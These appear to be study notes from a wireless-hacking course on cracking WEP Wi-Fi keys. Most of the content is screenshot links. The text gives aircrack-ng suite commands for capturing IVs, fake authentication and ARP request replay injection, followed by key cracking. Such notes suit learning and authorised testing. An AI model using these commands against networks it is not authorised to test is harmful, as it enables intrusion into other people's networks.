![[Screenshot 2025-03-05 182121.png]]

## Gaining Access - WEP Cracking
![[Screenshot 2025-03-05 182236.png]]![[Screenshot 2025-03-05 182312.png]]
![[Screenshot 2025-03-05 182418.png]]
![[Screenshot 2025-03-05 182543.png]]
![[Screenshot 2025-03-05 182644.png]]

First, we need to start capturing the packets that contain IVs : `airodump-ng --bssid <SSID> --channel <number> --write <filename> mon0`
Then we need to analyze them and crack the key : `aircrack-ng <filename>.cap`

A key will be provided to us which will help us in connecting the WiFi.
![[Screenshot 2025-03-05 183151.png]]

## Associating with Target Network using Fake Authentication Attack
And then this key provided is the password just by removing the `:`.
![[Screenshot 2025-03-05 183420.png]]
![[Screenshot 2025-03-05 184107.png]]
 To associate with the AP we'll use a tool called `aireplay-ng --fakeauth 0 -a <mac-of-targett-network> -h <mac-of-wireless-adapter> <name-of-wireless-adapter> `
Here we don't connect with the network accessing its internet rather we just associate with it which helps in communication.

## Packet Injection - ARP Request
![[Screenshot 2025-03-05 184627.png]]
Now, we'll run an Aireplay Attack : `aireplay-ng --arpreplay -b <mac-of-target-network> -h <mac-of-wireless-adapter> <name-of-wireless-adapter>` 

And then as soon as the ARP Request is received, we'll try to associated to the AP  :  `aireplay-ng --fakeauth 0 -a <mac> -h <mac> <wireless-adapter-name>`

Then after associating we'll run the command to crack the key using the command : `aircrack-ng <filename>.cap`

